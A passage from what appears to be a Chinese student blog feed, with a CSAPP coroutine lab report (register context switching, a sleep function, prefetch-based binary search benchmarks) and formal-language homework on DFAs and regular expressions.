class="token operator">-&gt;</span>caller_registers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* inc/context.h */</span>virtual <span class="token keyword">void</span> <span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 调用 coroutine_switch</span>    <span class="token comment">// 保存 callee-saved 寄存器, 恢复 callee-saved 寄存器</span>    <span class="token comment">// 将 rip 恢复到协程 yield 后需执行的指令地址</span>    <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>caller_registers<span class="token punctuation">,</span> callee_registers<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中 <code>basic_context</code> 类构造函数在堆上开辟了协程栈 <code>stack</code>, 因为 <code>x86-64</code> 要求运行栈栈帧按照 16 字节对齐, 因此需要将栈顶地址 <code>rsp</code> 低 16 字节置 0, 使其为 16 的倍数.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 栈顶地址 rsp</span><span class="token class-name">uint64_t</span> rsp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>stack<span class="token punctuation">[</span>stack_size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// 对齐到 16 字节边界</span>rsp <span class="token operator">=</span> rsp <span class="token operator">-</span> <span class="token punctuation">(</span>rsp <span class="token operator">&amp;</span> <span class="token number">0xF</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="额外要求"><a href="#额外要求" class="headerlink" title="额外要求"></a>额外要求</h3><ul><li><p><strong>执行 <code>coroutine_switch</code> 时栈的变化过程:</strong></p><p><img src="/pic/12.png"></p><ul><li>调度器通过 <code>resume()</code> 切换至协程内部时, 将 <code>callee registers</code> 保存在 <code>caller_registers[]</code>, 同时从 <code>callee_registers[]</code> 中恢复  <code>callee registers</code>, 并使用 <code>jmpq</code> 返回之前协程的结束地址.</li><li>协程函数通过 <code>yield()</code> 返回至调度器时, 将 <code>callee registers</code> 保存在 <code>callee_registees[]</code>, 同时从 <code>caller_registers[]</code> 中恢复 <code>callee registers</code>, 并使用 <code>jmpq</code> 返回调度器中.</li></ul></li><li><p><strong>协程是如何开始执行的:</strong></p><p>初始化一个协程时, <code>caller_registers</code> 用于保存 <code>coroutine pool</code> 的上下文, <code>callee_registers</code> 用于保存协程函数的上下文, <code>finished</code> 状态置为 <code>false</code>. 协程自身 <code>rip</code> 寄存器设置为 <code>coroutine_entry</code>,  <code>r12</code> 寄存器设置为 <code>coroutine_main</code> 地址, <code>r13</code> 寄存器设置为协程自身地址.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token operator">::</span>RSP<span class="token punctuation">]</span> <span class="token operator">=</span> rsp<span class="token punctuation">;</span><span class="token comment">// 协程入口是 coroutine_entry</span>callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token operator">::</span>RIP<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>coroutine_entry<span class="token punctuation">;</span><span class="token comment">// 设置 r12 寄存器为 coroutine_main 的地址</span>callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token operator">::</span>R12<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>coroutine_main<span class="token punctuation">;</span><span class="token comment">// 设置 r13 寄存器，用于 coroutine_main 的参数</span>callee_registers<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>Registers<span class="token operator">::</span>R13<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">uint64_t</span><span class="token punctuation">)</span>this<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当通过 <code>coroutines[i]-&gt;resume()</code> 进入该协程时,  <code>coroutine_switch</code> 会将 <code>callee_registers</code> 内容读入系统, 此时 <code>%rip</code> 存放了 <code>coroutine_entry</code> 的地址. <code>coroutine_entry</code> 将协程地址作为参数传入 <code>%rax</code> 并调用了 <code>coroutine_main</code>.</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">.global coroutine_entrycoroutine_entry:    movq %r13, %rdi    callq *%r12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>coroutine_main</code> 通过 <code>context-&gt;run()</code> 运行协程, 在运行完毕后将协程 <code>finished</code> 状态置为 <code>true</code>, 并通过 <code>coroutine_switch</code> 切换回调度器.</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">coroutine_main</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">basic_context</span> <span class="token operator">*</span>context<span class="token punctuation">)</span> <span class="token punctuation">{</span>    context<span class="token operator">-&gt;</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    context<span class="token operator">-&gt;</span>finished <span class="token operator">=</span> true<span class="token punctuation">;</span>    <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>context<span class="token operator">-&gt;</span>callee_registers<span class="token punctuation">,</span> context<span class="token operator">-&gt;</span>caller_registers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// unreachable</span>    <span class="token function">assert</span><span class="token punctuation">(</span>false<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>考虑浮点和向量寄存器的情况:</strong></p><p><code>AMD64</code> 架构中存在 <code>8</code> 个大小 <code>256</code> 位的 <code>Vector Registers</code>: <code>%xmm0</code> - <code>%xmm7</code>, <code>8</code> 个大小 <code>256</code> 位的 <code>Extended Vector Registers</code>: <code>%xmm8</code> - <code>%xmm15</code>, <code>8</code> 个大小 <code>80</code> 位的 <code>Floating Point Registers</code>: <code>%st0</code> - <code>%st7</code>.</p><p>只需在 <code>basic_context</code> 结构体初始化时开辟与 <code>Floating Point Registers</code> 和 <code>Vector Registers</code> 大小相应的 <code>uint64_t</code> 数组, 并在执行 <code>coroutine_switch</code> 时将相应 <code>register</code> 的内容分别 <code>save</code> 与 <code>load</code> 即可.</p></li></ul><h2 id="Task-2-实现-sleep-函数"><a href="#Task-2-实现-sleep-函数" class="headerlink" title="Task 2: 实现 sleep 函数"></a>Task 2: 实现 sleep 函数</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* inc/coroutine_pool.h */</span><span class="token keyword">void</span> <span class="token function">serial_execute_all</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    bool all_finished <span class="token operator">=</span> false<span class="token punctuation">;</span> <span class="token comment">// 记录所有协程函数是否执行完成</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span>all_finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>        all_finished <span class="token operator">=</span> true<span class="token punctuation">;</span>        <span class="token comment">// 采用轮询的方式挑选一个未完成执行的协程函数</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> coroutines<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment">// context 是否 finish</span>            <span class="token comment">// context 是否 ready</span>            <span class="token comment">// 调用ready_func 后 context 是否 ready</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>finished<span class="token punctuation">)</span> <span class="token punctuation">{</span>                all_finished <span class="token operator">=</span> false<span class="token punctuation">;</span>                <span class="token comment">// 判断当前协程的 ready 状态</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>ready<span class="token punctuation">)</span>                    <span class="token comment">// 更新 ready 状态</span>                    coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>ready <span class="token operator">=</span> coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">ready_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// 当前协程为 ready 状态时进入协程</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span>ready<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment">// 更改正在执行的协程 id</span>                    context_id <span class="token operator">=</span> i<span class="token punctuation">;</span>                    <span class="token comment">// 调用 resume() 返回调度器</span>                    coroutines<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-&gt;</span><span class="token function">resume</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* inc/common.h */</span><span class="token keyword">void</span> <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> ms<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">// 从 g_pool 中获取当前协程状态</span>    <span class="token keyword">auto</span> context <span class="token operator">=</span> g_pool<span class="token operator">-&gt;</span>coroutines<span class="token punctuation">[</span>g_pool<span class="token operator">-&gt;</span>context_id<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 将协程置为 false</span>    context<span class="token operator">-&gt;</span>ready <span class="token operator">=</span> false<span class="token punctuation">;</span>    <span class="token comment">// 获取当前时间，更新 ready_func</span>    <span class="token comment">// ready_func：检查当前时间，如果已经超时，则返回 true</span>    <span class="token keyword">auto</span> cur <span class="token operator">=</span> <span class="token function">get_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 使用 Lambda 表达式注册一个新的 ready_func 函数</span>    <span class="token comment">// 在至少 ms 毫秒之后将协程置为可用状态</span>    context<span class="token operator">-&gt;</span>ready_func <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">&amp;</span>cur<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ms<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span>bool<span class="token punctuation">{</span> <span class="token keyword">return</span> std<span class="token operator">::</span>chrono<span class="token operator">::</span>duration_cast<span class="token operator">&lt;</span>std<span class="token operator">::</span>chrono<span class="token operator">::</span>milliseconds<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token function">get_time</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> cur<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&gt;=</span> ms<span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token comment">// 调用 coroutine_switch 实现 yield 协程</span>    <span class="token function">coroutine_switch</span><span class="token punctuation">(</span>context<span class="token operator">-&gt;</span>callee_registers<span class="token punctuation">,</span> context<span class="token operator">-&gt;</span>caller_registers<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="额外要求-1"><a href="#额外要求-1" class="headerlink" title="额外要求"></a>额外要求</h3><ul><li><p><strong>绘制出 <code>sleep_sort</code> 中不同协程的运行情况:</strong></p><p>以输入 <code>1, 3, 4, 5, 2</code> 为例, 不同协程的运行情况如下图所示:</p><p><img src="/pic/13.png"></p><table><thead><tr><th align="center">time/ms</th><th align="center">coroutine1</th><th align="center">coroutine2</th><th align="center">coroutine3</th><th align="center">coroutine4</th><th align="center">coroutine5</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">unready</td><td align="center">unready</td><td align="center">unready</td><td align="center">unready</td><td align="center">unready</td></tr><tr><td align="center">1</td><td align="center">ready</td><td align="center">unready</td><td align="center">unready</td><td align="center">unready</td><td align="center">unready</td></tr><tr><td align="center">2</td><td align="center">finish</td><td align="center">unready</td><td align="center">unready</td><td align="center">unready</td><td align="center">ready</td></tr><tr><td align="center">3</td><td align="center">finish</td><td align="center">ready</td><td align="center">unready</td><td align="center">unready</td><td align="center">finish</td></tr><tr><td align="center">4</td><td align="center">finish</td><td align="center">finish</td><td align="center">ready</td><td align="center">unready</td><td align="center">finish</td></tr><tr><td align="center">5</td><td align="center">finish</td><td align="center">finish</td><td align="center">finish</td><td align="center">ready</td><td align="center">finish</td></tr><tr><td align="center">6</td><td align="center">finish</td><td align="center">finish</td><td align="center">finish</td><td align="center">finish</td><td align="center">finish</td></tr></tbody></table><p>其中每当一个协程状态被更新为 <code>ready</code> 时, 系统会 <code>resume</code> 至该协程, 运行并输出相应结果.</p></li><li><p><strong>设计更加高效的实现方法:</strong></p><ul><li>在进行 <code>parallel_execute_all()</code> 时, 首先将所有协程的 <code>index</code> 依次加入一个 <code>_coroutine</code> 队列, 依次弹出队首 <code>index</code> 并切换至相应的协程. 若从该协程切出时, 协程状态为 <code>unready</code>, 则将其 <code>index</code> 加入一个 <code>_sleep</code> 优先队列; 若从该协程切出时, 协程状态为 <code>ready</code> 且 <code>unfinished</code>, 则将其加入原 <code>_coroutine</code> 队列.</li><li>在每次向 <code>_sleep</code> 加入 <code>index</code> 时为 <code>index</code> 维护一个变量 <code>time</code>, 它记录当前协程调用 <code>sleep(ms)</code> 后可将自身协程状态置为 <code>ready</code> 的时间点, 即 <code>time = ms + passed_time</code>, 其中 <code>passed_time</code> 为调用 <code>parallel_execute_all()</code> 后经过的时间. 以 <code>time</code> 为排序依据将 <code>index</code> 加入 <code>_sleep</code>. </li><li>在 <code>_coroutine</code> 为空队列后, 且时间到达队首元素的 <code>time</code> 时, 弹出 <code>_sleep</code> 队首元素, 更新其 <code>ready</code> 状态并切入相应协程. 通过如此操作可以节省无效轮询的时间占用.</li></ul></li></ul><h2 id="Task-3-利用协程优化二分查找"><a href="#Task-3-利用协程优化二分查找" class="headerlink" title="Task 3: 利用协程优化二分查找"></a>Task 3: 利用协程优化二分查找</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* src/binary_search.cpp */</span><span class="token keyword">void</span> <span class="token function">lookup_coroutine</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">uint32_t</span> <span class="token operator">*</span>table<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> value<span class="token punctuation">,</span> <span class="token class-name">uint32_t</span> <span class="token operator">*</span>result<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment">// 使用 __builtin_prefetch 预取容易产生缓存缺失的内存</span>    <span class="token function">__builtin_prefetch</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>table<span class="token punctuation">[</span>probe<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 在协程 IO 期间进行其他函数调用</span>    <span class="token function">yield</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>__builtin_prefetch</code> 的三个参数分别为 <code>操作地址</code>、<code>读 \ 写</code>、<code>时间局部性</code>.</p><p>第二个参数为 <code>0</code>, 表示进行内存读取; 第三个参数为 <code>3</code>, 表示被访问的数据具有高时间局部性, 在被访问不久之后非常有可能再次访问.</p><h3 id="额外要求-2"><a href="#额外要求-2" class="headerlink" title="额外要求"></a>额外要求</h3><ul><li><p><strong>测试环境:</strong></p><blockquote><p>Architecture: x86_64</p><p>Model name: Intel(R) Xeon(R) CPU E5-4610 v2 @ 2.30GHz</p><p>CPU MHz: 2294.600</p><p>CPU max MHz: 2700.0000</p><p>CPU min MHz: 1200.0000</p><p>PS: 对每组实验条件均进行了十次测试, 并对耗时取平均值</p></blockquote></li><li><p><strong>测试 <code>Size (l)</code> 的影响因素:</strong></p><table><thead><tr><th align="center">Size (l)</th><th align="center">naive (per access) / ns</th><th align="center">coroutine (per access) / ns</th></tr></thead><tbody><tr><td align="center">4</td><td align="center">1.61</td><td align="center">62.53</td></tr><tr><td align="center">8</td><td align="center">2.53</td><td align="center">52.37</td></tr><tr><td align="center">12</td><td align="center">3.63</td><td align="center">50.06</td></tr><tr><td align="center">16</td><td align="center">3.87</td><td align="center">47.24</td></tr><tr><td align="center">20</td><td align="center">8.27</td><td align="center">47.71</td></tr><tr><td align="center">24</td><td align="center">28.04</td><td align="center">46.01</td></tr><tr><td align="center">28</td><td align="center">45.53</td><td align="center">44.92</td></tr><tr><td align="center">32</td><td align="center">58.99</td><td align="center">46.71</td></tr></tbody></table><blockquote><p>此时使用默认参数 <code>m = 1e6</code>, <code>b = 16</code>.</p></blockquote></li><li><p>所给数据范围较小时, 缓存的效果不显著, 在协程调度的轮询与切换上消耗了过多时间, 协程查找效果并不显著;</p></li><li><p>所给数据范围较大时, 协程查找可以在某协程进行 IO 操作时切入其他协程, 实现了时间优化.</p></li><li><p><strong>测试 <code>Loops (m)</code> 的影响因素:</strong></p><table><thead><tr><th align="center">Loops (m)</th><th align="center">naive (per access) / ns</th><th align="center">coroutine (per access) / ns</th></tr></thead><tbody><tr><td align="center">80</td><td align="center">98.74</td><td align="center">87.52</td></tr><tr><td align="center">400</td><td align="center">82.47</td><td align="center">57.18</td></tr><tr><td align="center">2000</td><td align="center">75.70</td><td align="center">51.34</td></tr><tr><td align="center">10000</td><td align="center">67.64</td><td align="center">50.73</td></tr><tr><td align="center">100000</td><td align="center">59.74</td><td align="center">51.60</td></tr><tr><td align="center">1000000</td><td align="center">62.28</td><td align="center">57.86</td></tr><tr><td align="center">10000000</td><td align="center">61.31</td><td align="center">56.65</td></tr></tbody></table><blockquote><p>此时使用默认参数 <code>l = 32</code>, <code>b = 16</code>.</p></blockquote></li><li><p>随着查找次数的增多, 缓存的数据量随着查找次数增大, 在之后进行查找更容易命中缓存, 直接二分查找和协程查找的性能都增强了.</p></li><li><p><strong>测试 <code>Batch size (b)</code> 的影响因素:</strong></p><table><thead><tr><th align="center">Batch size (b)</th><th align="center">naive (per access) / ns</th><th align="center">coroutine (per access) / ns</th></tr></thead><tbody><tr><td align="center">4</td><td align="center">59.46</td><td align="center">55.01</td></tr><tr><td align="center">8</td><td align="center">62.66</td><td align="center">51.95</td></tr><tr><td align="center">20</td><td align="center">60.47</td><td align="center">57.72</td></tr><tr><td align="center">32</td><td align="center">58.93</td><td align="center">87.17</td></tr><tr><td align="center">50</td><td align="center">63.34</td><td align="center">86.26</td></tr><tr><td align="center">80</td><td align="center">61.43</td><td align="center">89.07</td></tr><tr><td align="center">100</td><td align="center">60.58</td><td align="center">98.05</td></tr><tr><td align="center">1000</td><td align="center">57.43</td><td align="center">170.98</td></tr><tr><td align="center">10000</td><td align="center">60.23</td><td align="center">259.12</td></tr></tbody></table><blockquote><p>此时使用默认参数 <code>l = 32</code>, <code>m = 1e6</code>.</p></blockquote></li><li><p><code>Batch size</code> 的增大不会影响直接二分查找的性能; <code>Batch size</code> 增大时, 协程查找的性能在增加后迅速降低;</p></li><li><p>当 <code>Batch size</code> 较小时, 协程查找在一次轮询后可能并未完成相应 IO 操作, 浪费了时间; 而当 <code>Batch size</code> 较大时, 协程轮询与调度操作消耗时间过多, 性能降低.</p></li></ul><h2 id="沟通与交流情况"><a href="#沟通与交流情况" class="headerlink" title="沟通与交流情况"></a>沟通与交流情况</h2><ul><li>与陈鑫圣同学交流了如何设计更加高效的 <code>sleep_sort</code>, 以及不同因素对二分查找性能的影响.</li><li>参考了<a href="https://ouuan.github.io/post/lambda-capture-local-variable-by-reference/">本篇文章</a>, 使用 <code>lambda</code> 表达式实现在 <code>sleep()</code> 内更新 <code>ready_func</code> 的操作.</li></ul><h2 id="个人小结与感想"><a href="#个人小结与感想" class="headerlink" title="个人小结与感想"></a>个人小结与感想</h2><p>这是我第一次接触协程的概念与原理, 进行理解与尝试时感到了不小的困难, 在经过习题课对实验框架的具体分析以及自己的尝试后, 我觉得自己更加深刻地了解了协程原理. 通过与同学的交流、对资料的检索, 我明白了考量程序性能的必要性与重要性, 对计算机系统的组成原理有了更为深刻的认识.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业4</title>
      <link href="/22/"/>
      <url>/22/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-3-2-1-c"><a href="#Ex-3-2-1-c" class="headerlink" title="Ex 3.2.1 (c)"></a>Ex 3.2.1 (c)</h3><p>​    构造基础表达式:</p><p><img src="/pic/27.png"></p><p>​    考虑只经过状态 $1$ 的路径的正则表达式:</p><p><img src="/pic/28.png"></p><p>​    考虑经过任意状态的路径的正则表达式:</p><p><img src="/pic/29.png"></p><h3 id="Ex-3-2-1-d"><a href="#Ex-3-2-1-d" class="headerlink" title="Ex 3.2.1 (d)"></a>Ex 3.2.1 (d)</h3><p>​    该 $DFA$ 的语言对应的一个正规表达式为:</p><p>​    $$R_{13}^{(3)} = R_{13}^{(2)} + R_{13}^{(2)}{(R_{33}^{(2)})}^{<em>}R_{33}^{(2)} = \mathbf{1^</em>0(11^<em>0)^</em>0(0 + 1(11^<em>0)^</em>0)^*}.$$</p><h3 id="Ex-3-2-3"><a href="#Ex-3-2-3" class="headerlink" title="Ex 3.2.3"></a>Ex 3.2.3</h3><p>​    该自动机的原始状态图为:</p><p><img src="/pic/30.png"></p><p>​    消去状态 $q$ 后的状态图为:</p><p><img src="/pic/31.png"></p><p>​    消去状态 $r$ 后的状态图为:</p><p><img src="/pic/32.png"></p><p>​    消去状态 $s$ 后的状态图为:</p><p><img src="/pic/33.png"></p><p>​    故这个 $DFA$ 转化为正则表达式为:</p><p>​    $$\mathbf{(1 + 0(01 + 10^<em>11)^</em>(00 + 10^<em>10))^</em>}.$$</p><h3 id="Ex-3-2-4-b"><a href="#Ex-3-2-4-b" class="headerlink" title="Ex 3.2.4 (b)"></a>Ex 3.2.4 (b)</h3><p>​    一个满足题意的 $\varepsilon-NFA$ 为:</p><p><img src="/pic/34.png"></p><h3 id="Ex-3-2-4-c"><a href="#Ex-3-2-4-c" class="headerlink" title="Ex 3.2.4 (c)"></a>Ex 3.2.4 (c)</h3><p>​    一个满足题意的 $\varepsilon-NFA$ 为:</p><p><img src="/pic/35.png"></p><h3 id="Ex-3-2-6"><a href="#Ex-3-2-6" class="headerlink" title="Ex 3.2.6"></a>Ex 3.2.6</h3><p>​    $(a)$ 为 $L^*$;</p><p>​    $(b)$ 为 $L$ 中所有字符串的所有后缀串组成的集合;</p><p>​    $(c)$ 为 $L$ 中所有字符串的所有前缀串组成的集合;</p><p>​    $(d)$ 为 $L$ 中所有字符串的所有子串组成的集合.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业3</title>
      <link href="/21/"/>
      <url>/21/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-2-2-2"><a href="#Ex-2-2-2" class="headerlink" title="Ex 2.2.2"></a>Ex 2.2.2</h3><p>​    对任意状态 $q$ 及串 $x$ 和 $y$, 我们证明 $\hat\delta(q, xy) = \hat\delta(\hat\delta(q, x), y)$.</p><p>​    对 $\vert y\vert$ 进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $\vert y\vert = 0$, 即 $y = \varepsilon$, </p><p>​    那么由 $\hat\delta$ 的定义知 </p><p>​    $$\hat\delta(\hat\delta(q, x), y) = \hat\delta(\hat\delta(q, x), \varepsilon) = \hat\delta(q, x) = \hat\delta(q, xy),$$</p><p>​    至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现假定 $\vert y\vert = n\thinspace(n\ge 1)$, 且对任何串 $y_0\thinspace(\vert y_0\vert &lt; n)$, 上述命题为真.</p><p>​    也就是说, 如果 $\vert y_0\vert \le n - 1$, 那么$\hat\delta(q, xy_0) = \hat\delta(\hat\delta(q, x), y_0)$.</p><p>​    设 $y = y_0a$, 其中 $a$ 为串 $y$ 的最后一个元素.</p><p>​    那么结合 $\hat\delta$ 的定义得:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \hat\delta(\hat\delta(q, x), y) &amp;= \hat\delta(\hat\delta(q, x), y_0a) \</p><p>​            &amp;= \delta(\hat\delta(\hat\delta(q, x), y_0), a) \</p><p>​            &amp;= \delta(\hat\delta(q, xy_0), a) \</p><p>​            &amp;= \hat\delta(q, xy_0a) \</p><p>​            &amp;= \hat\delta(q, xy).</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    至此归纳得证.</p><h3 id="Ex-2-2-4-b"><a href="#Ex-2-2-4-b" class="headerlink" title="Ex 2.2.4 (b)"></a>Ex 2.2.4 (b)</h3><p>​    一个接受该语言的 $DFA$ 的转移表为:</p><p>​        <img src="/pic/14.png"></p><h3 id="Ex-2-2-4-c"><a href="#Ex-2-2-4-c" class="headerlink" title="Ex 2.2.4 (c)"></a>Ex 2.2.4 (c)</h3><p>​    一个接受该语言的 $DFA$ 的转移表为:</p><p>​<img src="/pic/15.png"></p><h3 id="Ex-2-2-5-d"><a href="#Ex-2-2-5-d" class="headerlink" title="Ex 2.2.5 (d)"></a>Ex 2.2.5 (d)</h3><p>​    一个接受该语言的 $DFA$ 的转移表为:</p><p>​    <img src="/pic/16.png"></p><h3 id="Ex-2-2-7"><a href="#Ex-2-2-7" class="headerlink" title="Ex 2.2.7"></a>Ex 2.2.7</h3><p>​    对任意输入串 $w$, 我们证明 $\hat\delta(q, w) = q$.</p><p>​    对 $\vert w\vert$ 进行归纳:</p><p>​    \textbf{<strong>基础:</strong>} 如果 $\vert w\vert = 0$, 即 $w = \varepsilon$, </p><p>​    那么由 $\hat\delta$ 的定义知 </p><p>​    $$\hat\delta(q, w) = \hat\delta(q, \varepsilon) = q,$$</p><p>​    至此基础得证.</p><p>​    \textbf{<strong>归纳:</strong>} 现设 $\vert w\vert = n\thinspace(n\ge 1)$, 且对任何串 $w_0\thinspace(\vert w_0\vert &lt; n)$ 上述命题为真.</p><p>​    也就是说, 如果$\vert w_0\vert \le n - 1$, 那么$\hat\delta(q, w_0) = q$.</p><p>​    设 $w = w_0a$, 其中 $a$ 为串 $w$ 的最后一个元素.</p><p>​    那么结合 $\hat\delta$ 的定义得:</p><p>​    \begin{equation*}</p><p>​        \begin{aligned}</p><p>​            \hat\delta(q, w) &amp;= \hat\delta(q, w_0a) \</p><p>​            &amp;= \delta(\hat\delta(q, w_0), a) \</p><p>​            &amp;= \delta(q, a) \</p><p>​            &amp;= q.</p><p>​        \end{aligned}</p><p>​    \end{equation*}</p><p>​    至此归纳得证.</p><h3 id="Ex-2-2-9"><a 